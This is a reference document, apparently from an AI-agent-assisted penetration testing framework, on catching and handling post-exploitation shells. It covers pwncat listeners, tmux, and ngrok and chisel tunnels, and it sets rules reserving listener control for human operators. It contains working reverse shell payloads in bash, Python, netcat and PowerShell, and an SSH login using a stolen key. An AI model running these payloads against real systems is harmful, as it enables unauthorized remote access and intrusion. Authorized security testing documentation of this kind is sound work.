# Shell Handling & Post-Exploitation Listeners

## Architecture

Listeners (pwncat-vl, ngrok, chisel) are OPERATOR-CONTROLLED shared infrastructure.
Agents must never start them. The Kali runtime is shared across engagements — an agent
starting a listener on port 4444 could conflict with another engagement's listener.
ngrok tunnels are account-scoped — starting a second tunnel tears down the first.

**Agent responsibility:** provide the exact commands in `# MANUAL:` playbook steps.
**Operator responsibility:** execute them, then signal the agent to continue.

## pwncat-vl Listener Commands

pwncat-vl is the maintained fork of pwncat-cs with Python 3.13+ support.

### Basic TCP listener
```bash
docker exec -it security-research tmux new-session -d -s shell-4444 \
  'pwncat -l -p 4444 2>&1 | tee /data/shell-4444.log'
```

### SSL/TLS listener
```bash
docker exec -it security-research tmux new-session -d -s shell-ssl \
  'pwncat -l -p 4444 --ssl 2>&1 | tee /data/shell-ssl.log'
```

### Connecting to a bind shell
```bash
docker exec -it security-research tmux new-session -d -s shell-bind \
  'pwncat -c TARGET_IP -p 4444 2>&1 | tee /data/shell-bind.log'
```

### SSH-based session (with stolen credentials)
```bash
docker exec -it security-research tmux new-session -d -s shell-ssh \
  'pwncat -c TARGET_IP -p 22 --ssh --identity /data/stolen_key 2>&1 | tee /data/shell-ssh.log'
```

## tmux Session Management

### Naming convention
Sessions are named `shell-<port>` or `shell-<descriptive-tag>`.

### Common commands
```bash
# List active sessions
docker exec security-research tmux list-sessions

# Attach to a session (interactive — operator use only)
docker exec -it security-research tmux attach -t shell-4444

# Send a command to a running session (non-interactive)
docker exec security-research tmux send-keys -t shell-4444 'whoami' Enter

# Read recent output from the log
docker exec security-research tail -50 /data/shell-4444.log

# Kill a session when done
docker exec security-research tmux kill-session -t shell-4444
```

### Log file tailing (LLM visibility)

Agents observe shell output by reading log files via Kali MCP — not by attaching to tmux:
```bash
# Via Kali MCP execute_command:
tail -f /data/shell-4444.log    # live follow
tail -100 /data/shell-4444.log  # last 100 lines
cat /data/shell-4444.log        # full log
```

Log files under `/data/` persist across tmux restarts because `/data` is the
engagement volume mount point.

## Exposing Listeners Externally

### ngrok (installed)
```bash
# Expose pwncat listener on port 4444
docker exec -e NGROK_AUTHTOKEN="$NGROK_AUTHTOKEN" \
  -it security-research ngrok tcp 4444
```
Note the public `host:port` from ngrok output and substitute it in reverse shell payloads.

**ngrok is account-scoped.** Most accounts allow one tunnel at a time. The operator
must manage tunnel lifecycle — agents must not start or stop ngrok.

### chisel / SSH tunnels / other forwarding (installed)

For detailed chisel, SSH tunnel, NTLM relay, and port forwarding commands, see
`agent/references/offensive-tactics/lateral-movement/tunneling-relaying.md`.

Quick chisel example for exposing a pwncat listener:
```bash
docker exec -it security-research tmux new-session -d -s chisel-server \
  'chisel server --reverse --port 8080 2>&1 | tee /data/chisel.log'
# Victim: chisel client ATTACKER_HOST:8080 R:4444:127.0.0.1:4444
```

### frp (not installed)
frp is not bundled. If the operator needs it, install manually.

## Reverse Shell Payloads

These are what agents embed in exploit commands. The `LISTENER_HOST` and `LISTENER_PORT`
values come from the operator after they set up the listener and tunnel.

### Linux
```bash
# Bash TCP
bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1

# Python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LISTENER_HOST",LISTENER_PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Netcat (if available on target)
nc -e /bin/bash LISTENER_HOST LISTENER_PORT

# Netcat without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LISTENER_HOST LISTENER_PORT >/tmp/f
```

### Windows
```powershell
# PowerShell one-liner
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LISTENER_HOST',LISTENER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"
```

## Integration with Existing Systems

### HTTP callback listener (`start-callback`)
The HTTP callback listener is for blind SSRF, OOB, and webhook validation — NOT for
reverse shells. Use pwncat-vl for reverse shells and `start-callback` for HTTP callbacks.
They are complementary.

### Metasploit (optional sidecar)
MSF remains available for exploit modules (gadget generation, specific CVE exploits).
For shell handling (catching reverse shells, session management), use pwncat-vl instead.
MSF's memory footprint (~1.5GB+) makes it impractical as a persistent shell handler
when running alongside the primary Kali runtime.

## Agent Rules

Agents **MUST NOT:**
- Start `pwncat`, `nc -lvp`, `socat` as a listener, or any listening socket
- Start `ngrok`, `frp`, or `chisel server`
- Kill or restart existing listener or tunnel sessions

Agents **CAN:**
- Read listener log files (`tail /data/shell-*.log`) via Kali MCP
- Provide reverse shell payloads for the operator to deploy
- Verify that a shell connected by checking log output
- Send commands to an established shell via `tmux send-keys` (if operator authorizes)

Agents **MUST:**
- Mark shell-catching steps as `# MANUAL:` in playbooks
- Include the full listener commands the operator should run
- Reference this file (`agent/references/offensive-tactics/shell-handling.md`)
- Wait for operator confirmation before proceeding past a manual step
